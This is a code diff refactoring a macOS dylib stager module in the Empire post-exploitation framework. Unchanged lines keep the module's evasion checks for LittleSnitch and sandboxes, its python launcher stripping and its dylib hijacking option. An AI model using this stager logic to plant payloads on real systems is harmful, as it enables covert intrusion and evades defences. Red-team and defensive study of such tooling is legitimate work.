@@ -1,5 +1,8 @@
+import logging
+
 from empire.server.common import helpers
-from empire.server.utils.string_util import removeprefix, removesuffix
+
+log = logging.getLogger(__name__)
 
 
 class Stager:
@@ -39,7 +42,7 @@ class Stager:
                 "Value": "x86",
             },
             "SafeChecks": {
-                "Description": "Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
+                "Description": "Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                 "Required": True,
                 "Value": "True",
                 "SuggestedValues": ["True", "False"],
@@ -55,7 +58,7 @@ class Stager:
             "OutFile": {
                 "Description": "Filename that should be used for the generated output.",
                 "Required": True,
-                "Value": "",
+                "Value": "empire.dylib",
             },
             "UserAgent": {
                 "Description": "User-agent string to use for the staging request (default, none, or other).",
@@ -64,12 +67,9 @@ class Stager:
             },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
     def generate(self):
-        # extract all of our options
         language = self.options["Language"]["Value"]
         listener_name = self.options["Listener"]["Value"]
         user_agent = self.options["UserAgent"]["Value"]
@@ -81,21 +81,20 @@ class Stager:
             print(helpers.color("[!] Please select a valid architecture"))
             return ""
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(
+        launcher = self.mainMenu.stagergenv2.generate_launcher(
             listener_name,
             language=language,
-            userAgent=user_agent,
-            safeChecks=safe_checks,
+            user_agent=user_agent,
+            safe_checks=safe_checks,
         )
 
         if launcher == "":
             print(helpers.color("[!] Error in launcher command generation."))
             return ""
 
-        launcher = removeprefix(launcher, "echo ")
-        launcher = removesuffix(launcher, " | python3 &")
+        launcher = launcher.removeprefix("echo ")
+        launcher = launcher.removesuffix(" | python3 &")
         launcher = launcher.strip('"')
-        return self.mainMenu.stagers.generate_dylib(
-            launcherCode=launcher, arch=arch, hijacker=hijacker
+        return self.mainMenu.stagergenv2.generate_dylib(
+            launcher_code=launcher, arch=arch, hijacker=hijacker
         )
